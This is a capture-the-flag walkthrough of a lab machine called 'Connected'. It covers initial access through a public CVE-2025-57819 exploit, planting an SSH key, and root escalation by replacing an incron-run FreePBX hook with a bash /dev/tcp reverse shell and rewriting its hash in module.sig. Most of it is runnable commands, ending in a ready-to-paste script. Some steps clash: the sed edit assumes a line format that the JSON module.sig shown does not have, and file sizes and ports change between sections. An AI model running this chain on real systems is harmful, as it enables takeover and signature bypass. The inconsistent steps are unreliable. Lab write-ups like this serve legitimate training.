# Connected

<img width="1589" height="289" alt="image" src="https://github.com/user-attachments/assets/4bea11c6-c4a3-495c-bde6-d3c08139e55a" />

----

## Nmap `Scan`

```
nmap -sCV -Pn 10.129.16.73
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-07 19:36 EDT
Stats: 0:00:25 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 90.61% done; ETC: 19:36 (0:00:00 remaining)
Nmap scan report for 10.129.16.73
Host is up (0.097s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
|   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
|_  256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
80/tcp  open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-title: Did not follow redirect to http://connected.htb/
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
443/tcp open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
| http-title: 404 Not Found
|_Requested resource was config.php
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2025-11-30T14:07:27
|_Not valid after:  2026-11-30T14:07:27

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.49 seconds

```

<img width="1919" height="859" alt="image" src="https://github.com/user-attachments/assets/ef6c2a17-ba39-49c7-b708-f3473cfab69e" />

## search for exploit for it found 

## [CVE-2025-57819](https://github.com/b4sh2/CVE-2025-57819-poc)

```
python3 exploit.py http://connected.htb --ip 10.10.17.161 -p 4444
```

<img width="1251" height="588" alt="image" src="https://github.com/user-attachments/assets/7647099e-3d69-486b-b89d-87eceb0d5469" />

```
ssh-keygen -t rsa -b 4096 -f ~/asterisk_key -N ""
cat ~/asterisk_key.pub
```

```
# Create .ssh directory and add the key
mkdir -p /home/asterisk/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCjmQl9t0cMGKrRwapu/hWDVk00iWAgYs91kp6fi3XAVE41DMU8Xn8pTxjU14J9j0wH9u5u4yRLQUihWNeXVof+Z1CV5ZvwI3DLBpSRIGnHxb+UkM2cBPTysJlXI2JYSqObw60M2CzF5F6xubmaKFQ/e4ikJxmUSsZ/VfyDGBB+CPPQx62X88vr9nHf8GHAEoYa6T/bABngwva4q1XStkZ1hk+QgtvMe/6t3tx1vR1hhu+j6Lfs9+Dn455sJRcqLPvPrTqW7KdRrR1YmcILH4tKewRxaAA6TUDO0UGrC2qoAbm0Zp/yv0bqGjhl7iUoj8Wxu79SrevdjBZ9GVSmZBxVzfKt7+4yDYbG9O8hzt1EloZrsCr4e+2UF981B3vuz25Rijvh8Qvf1uRkxRGaep61tbsUW+GtOkUG2XusLXW9da/T7yNFrIlavxqwINp15NFY6PcQk2548igjiEZVD4M8oPiVcBwBV+vPZ7SGJTqxayBFTgT6xzCH83ZaXsakvMsKsuV+tnffgZgh17ho8YAQfcwmsuF424tsCU66lYkudZWQdDCRPXoS2E8FP2R0qASTk7XyWYvACRic0CeTV8JrPsUVElV4EMmIeQZxoCVoMRU7yom24vgAGlfIrD2XVYbXU5l3J/Qq1A7L3IKjreuxLy3X0GWPfrzdZGwV4S2cXQ== kali@kali" > /home/asterisk/.ssh/authorized_keys

# Set proper permissions
chmod 700 /home/asterisk/.ssh
chmod 600 /home/asterisk/.ssh/authorized_keys

# Verify
ls -la /home/asterisk/.ssh/
cat /home/asterisk/.ssh/authorized_keys
```

## privesc

```ruby
[asterisk@connected ~]$ ps aux | grep incron
root       765  0.0  0.0  15044  2896 ?        Ss   Jun07   0:00 /usr/sbin/incrond
```

```ruby
[asterisk@connected ~]$ ls -la /etc/incron.d/
total 4
drwxr-xr-x.  2 root root  19 Nov 30  2025 .
drwxr-xr-x. 98 root root 8192 Jun  8 01:24 ..
-rwxr-xr-x.  1 root root  91 Apr 15  2021 sysadmin
```

<img width="792" height="253" alt="image" src="https://github.com/user-attachments/assets/0eaff07a-623e-4bf8-88b4-bfd303e7a4db" />

```
cat /etc/incron.d/sysadmin
```

<img width="981" height="119" alt="image" src="https://github.com/user-attachments/assets/b5893be4-f725-43b8-9645-66d917caa894" />

 First: What is incron?
========================

`incron` = short for **inotify cron**

It's like cron, but different:

- cron = runs commands at certain times (every minute/hour...)
- incron = Runs commands **when a file changes**

---

1️⃣ Watch path
-------------------------

```
/var/spool/asterisk/incron
```

Meaning:\
 Any file inside this folder

* * * * *

2️⃣ Events
--------------------

```
IN_MODIFY → When the file is modified IN_ATTRIB → When attributes are changed IN_CLOSE_WRITE → When it is closed after writing
```

* * * * *

3️⃣ When this happens → it works:
-------------------------

```
/usr/bin/sysadmin_manager $#
```

* * * * *

 practically means:
---------------

Anyone who writes or edits a file in:

```
/var/spool/asterisk/incron
```

 The system will operate automatically:

```
sysadmin_manager
```

---

> ### Why this is critical: Any file we create in /var/spool/asterisk/incron/ will trigger sysadmin_manager to run as root with our filename as an argument!

## Test incron is Working

```ruby
[asterisk@connected ~]$ echo "test" > /var/spool/asterisk/incron/test.file
[asterisk@connected ~]$ ls /var/spool/asterisk/incron/test.file
ls: cannot access /var/spool/asterisk/incron/test.file: No such file or directory
```

<img width="1010" height="156" alt="image" src="https://github.com/user-attachments/assets/826b2676-47d7-431d-88ff-e1634c3c711c" />

> #### Observation: The file disappears immediately. This confirms incron is active and the sysadmin_manager script is deleting the file after processing.

---

# Hook System Analysis

## Examine sysadmin_manager Script

```ruby
[asterisk@connected ~]$ file /usr/bin/sysadmin_manager
/usr/bin/sysadmin_manager: PHP script, ASCII text executable

[asterisk@connected ~]$ head -50 /usr/bin/sysadmin_manager
```

<img width="1320" height="442" alt="image" src="https://github.com/user-attachments/assets/eba92987-c3da-4a7f-9752-decb1f1b6a3e" />

The script is a PHP application that:

1- Receives a filename as argument (our incron trigger)

2- Deletes the file immediately

3- Validates the filename format: module_hook or module.hook.params

4- Checks GPG signatures of modules

5- Verifies SHA256 hashes of hook files against module.sig

6- Executes the hook as root if all checks pass

---

## Understand the Hook Execution Flow

```php
// Simplified logic from sysadmin_manager
$filename = "/var/spool/asterisk/incron/$request";
unlink($filename);  // Delete the trigger file

// Parse filename format
if (preg_match('/^(\w+)_([\w-]+)$/', $request, $parts)) {
    $module = $parts[1];
    $hook = $parts[2];
}

// Check GPG signature of module
$verify = $g->checkSig("/var/www/html/admin/modules/$module/module.sig");

// Verify hook file hash matches signature
if (hash_file('sha256', $hookfile) !== $verify['hashes'][$signame]) {
    exit;  // Hash mismatch - reject
}

// Execute hook
system("$hookfile $params");
```

---

## Find Writable Hooks

We need a hook that:

1.  Exists in a module

2.  Is writable by the asterisk user

3.  We can modify without breaking the module

```ruby
[asterisk@connected ~]$ find /var/www/html/admin/modules -name "hooks" -type d
/var/www/html/admin/modules/adv_recovery/hooks
/var/www/html/admin/modules/api/hooks
/var/www/html/admin/modules/backup/hooks
...
/var/www/html/admin/modules/ucp/hooks
```

<img width="1175" height="529" alt="image" src="https://github.com/user-attachments/assets/54f4e30f-ceb5-4706-8461-b67761d49805" />

## Check Permissions on UCP Hooks

```ruby
[asterisk@connected ~]$ ls -la /var/www/html/admin/modules/ucp/hooks/
total 548
drwxr-xr-x.  2 asterisk asterisk  4096 Nov 30  2025 .
drwxrwxr-x. 16 asterisk asterisk  4096 Nov 30  2025 ..
-rwxr-xr-x.  1 asterisk asterisk  8521 Nov  2  2023 logrotate
-rwxr-xr-x.  1 asterisk asterisk 11576 Nov  2  2023 other-hooks...
```

> ### ⚠️ Key Discovery: The logrotate hook is owned by asterisk:asterisk and is writable by me! 

Why this is our target:

-   We can modify this file

-   It's a legitimate hook that exists in the signature file

-   It will be executed as root when triggered

---

# Signature Bypass

## Understand the Signature Verification

#### The module.sig file contains SHA256 hashes of all files in the module:

```ruby
[asterisk@connected ~]$ cat /var/www/html/admin/modules/ucp/module.sig
{
    "hashes": {
        "hooks/logrotate": "d2bbe3d0f80c298b55c1f6ef419b97ae06e7b93a2c93873469ffb28cc4cded47",
        "hooks/other-hook": "...",
        ...
    }
}
```

<img width="1033" height="548" alt="image" src="https://github.com/user-attachments/assets/6b9091a2-d162-4dc2-bb0b-85a7e91f7ced" />

> ### 🔴 The Vulnerability: The script checks the hash of the hook file against what's stored in module.sig. If we modify the hook, the hash will change and the script will reject it. BUT: we can also modify module.sig because it's writable by asterisk!

```
ls -la /var/www/html/admin/modules/ucp/module.sig
```

<img width="937" height="107" alt="image" src="https://github.com/user-attachments/assets/96dd70ad-7e06-4ebf-8c69-355cd253a14c" />

Attack Chain:

1- Modify the hook file with our malicious code

2- Calculate the new SHA256 hash of our modified hook

3- Update the hash in module.sig to match

4- Script sees matching hashes and executes our malicious hook as root!

---

## Backup Original Hook

```
cp /var/www/html/admin/modules/ucp/hooks/logrotate /tmp/logrotate.bak
```

<img width="899" height="67" alt="image" src="https://github.com/user-attachments/assets/ad6cf5fc-b6b9-4139-8959-f23b1b426c1a" />

> ### Why: If something goes wrong, we can restore the original hook.

---

## Create Malicious Hook

We'll replace the hook with a reverse shell:

```
cat > /var/www/html/admin/modules/ucp/hooks/logrotate << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.17.161/9999 0>&1
EOF
```

<img width="929" height="152" alt="image" src="https://github.com/user-attachments/assets/6a2f43a0-46ea-4bd1-b699-3354ad1c7a3d" />

---

## Calculate New SHA256 Hash

```ruby
[asterisk@connected ~]$ NEW_HASH=$(sha256sum /var/www/html/admin/modules/ucp/hooks/logrotate | awk '{print $1}')
[asterisk@connected ~]$ echo "New hash: $NEW_HASH"
New hash: 2b5188cc32ec83e023da0182f12dc9e68f6b8be7e8e7b69af85906041d786e08
```

<img width="1063" height="56" alt="image" src="https://github.com/user-attachments/assets/e5d606d6-ba0f-4e1b-b937-0fe9af12fbac" />

> ## Why we need this: The script will compute the SHA256 of our hook and compare it to the value in module.sig. They must match exactly.

---

## Update Signature File

```ruby
[asterisk@connected ~]$ sed -i "s/hooks\/logrotate = .*/hooks\/logrotate = $NEW_HASH/" /var/www/html/admin/modules/ucp/module.sig
```

What `sed` does:

-   `-i` - Edit file in-place

-   `s/old/new/` - Substitute pattern

-   `hooks\/logrotate = .*` - Find line containing this pattern

-   `hooks\/logrotate = $NEW_HASH` - Replace with our new hash

## Verify Signature Update

```ruby
[asterisk@connected ~]$ grep logrotate /var/www/html/admin/modules/ucp/module.sig
hooks/logrotate = 2b5188cc32ec83e023da0182f12dc9e68f6b8be7e8e7b69af85906041d786e08
```

<img width="1185" height="108" alt="image" src="https://github.com/user-attachments/assets/16af6ffe-a85b-4093-886c-edb8c1d450b3" />

> #### Why: We must confirm the hash was updated correctly. The script will reject our hook if the hash doesn't match exactly.

---

# Root Shell Execution

## Start Listener on Attacker Machine

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
```

---

## Trigger the Hook

```ruby
[asterisk@connected ~]$ touch /var/spool/asterisk/incron/ucp.logrotate
```

<img width="871" height="88" alt="image" src="https://github.com/user-attachments/assets/a8b90be4-aa36-4a0a-8a55-bf41f66caf1d" />

What happens:

1.  incron detects the file creation (`IN_CLOSE_WRITE`)

2.  incron executes `/usr/bin/sysadmin_manager ucp.logrotate` as root

3.  sysadmin_manager parses the filename: module=`ucp`, hook=`logrotate`

4.  sysadmin_manager verifies the hook hash matches (we updated it)

5.  sysadmin_manager executes `/var/www/html/admin/modules/ucp/hooks/logrotate`

6.  Our reverse shell connects back to our listener

---

## Catch the Root Shell

<img width="713" height="308" alt="image" src="https://github.com/user-attachments/assets/c1ea7273-31a9-4eef-b0bf-36c4eee91657" />

<img width="498" height="226" alt="MGIF" src="https://github.com/user-attachments/assets/6f663f70-a201-4810-83ca-228c63eb7d1f" />

---
---
---

### Step 1: Found incrond running as root

```bash

[asterisk@connected ~]$ ps aux | grep incron
root       765  0.0  0.0  15044  2896 ?        Ss   Jun07   0:00 /usr/sbin/incrond
```

What we learned: There's a daemon called `incrond` running with ROOT privileges.

* * * * *

### Step 2: Investigated incron configuration

```bash

[asterisk@connected ~]$ cat /etc/incron.d/sysadmin
/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
```

What we learned:

-   incrond monitors `/var/spool/asterisk/incron/`

-   Any file created/modified triggers `/usr/bin/sysadmin_manager`

-   The command runs as ROOT (because incrond runs as root)

* * * * *

### Step 3: Understood how sysadmin_manager works

```bash

[asterisk@connected ~]$ file /usr/bin/sysadmin_manager
/usr/bin/sysadmin_manager: PHP script, ASCII text executable
```

What sysadmin_manager does:

1.  Receives filename as argument (e.g., `ucp.logrotate`)

2.  Deletes the file immediately

3.  Parses filename format: `module.hook` or `module_hook`

4.  Looks for hook file in `/var/www/html/admin/modules/[module]/hooks/[hook]`

5.  Verifies SHA256 hash matches what's in `module.sig`

6.  Executes the hook as ROOT if verification passes

* * * * *

The Target Selection 🎯
-----------------------

### Step 4: Found writable hook

```bash

[asterisk@connected ~]$ ls -la /var/www/html/admin/modules/ucp/hooks/logrotate
-rwxr-xr-x. 1 asterisk asterisk 473 Nov  2  2023 logrotate
```

Why we chose this hook:

-   Owned by `asterisk` (same as our user) → WRITABLE!

-   Written in bash (easy to modify)

-   Exists in `module.sig` (signed by the system)

* * * * *

The Attack Execution 🎭
-----------------------

### Step 5: Modified the hook with reverse shell

```bash

[asterisk@connected ~]$ cat > /var/www/html/admin/modules/ucp/hooks/logrotate << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.17.161/4444 0>&1
EOF
```

What this does: Creates a reverse shell that connects back to our attacker machine.

* * * * *

### Step 6: Calculated new SHA256 hash

```bash

[asterisk@connected ~]$ sha256sum /var/www/html/admin/modules/ucp/hooks/logrotate
2b5188cc32ec83e023da0182f12dc9e68f6b8be7e8e7b69af85906041d786e08
```

Why: The modified hook has a different hash than the original. We need to update the signature file.

* * * * *

### Step 7: Updated module.sig with new hash

```bash

[asterisk@connected ~]$ sed -i "s/hooks\/logrotate = .*/hooks\/logrotate = 2b5188cc32ec83e023da0182f12dc9e68f6b8be7e8e7b69af85906041d786e08/" /var/www/html/admin/modules/ucp/module.sig
```

What this does: Replaces the old hash in the signature file with our new hash. Now the system will think our modified hook is legitimate!

* * * * *

### Step 8: Started listener on attacker machine

```bash

┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

Why: Waiting for the reverse shell connection from the target.

* * * * *

### Step 9: Triggered incron

bash

[asterisk@connected ~]$ touch /var/spool/asterisk/incron/ucp.logrotate

What happens:

1.  incrond detects the new file

2.  incrond executes `/usr/bin/sysadmin_manager ucp.logrotate` as ROOT

3.  sysadmin_manager parses: module=`ucp`, hook=`logrotate`

4.  sysadmin_manager checks hash → matches ✅

5.  sysadmin_manager executes `/var/www/html/admin/modules/ucp/hooks/logrotate`

6.  Our reverse shell connects to our listener

* * * * *

### Step 10: Received root shell

```bash

┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.17.161] from (UNKNOWN) [10.129.16.73] 45100
[root@connected /]# whoami
root

Success! We are now ROOT on the system.
```

```

# Step 1: Check if ucp/hooks/logrotate is writable
ls -la /var/www/html/admin/modules/ucp/hooks/logrotate

# Step 2: Backup original
cp /var/www/html/admin/modules/ucp/hooks/logrotate /tmp/logrotate.bak

# Step 3: Create reverse shell hook (replace IP and port)
cat > /var/www/html/admin/modules/ucp/hooks/logrotate << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.17.161/4444 0>&1
EOF

# Step 4: Make it executable
chmod +x /var/www/html/admin/modules/ucp/hooks/logrotate

# Step 5: Calculate new hash
NEW_HASH=$(sha256sum /var/www/html/admin/modules/ucp/hooks/logrotate | awk '{print $1}')
echo "New hash: $NEW_HASH"

# Step 6: Update module.sig (find the line with logrotate and replace)
sed -i "s/hooks\/logrotate = .*/hooks\/logrotate = $NEW_HASH/" /var/www/html/admin/modules/ucp/module.sig

# Step 7: Verify the signature file was updated
grep logrotate /var/www/html/admin/modules/ucp/module.sig

```

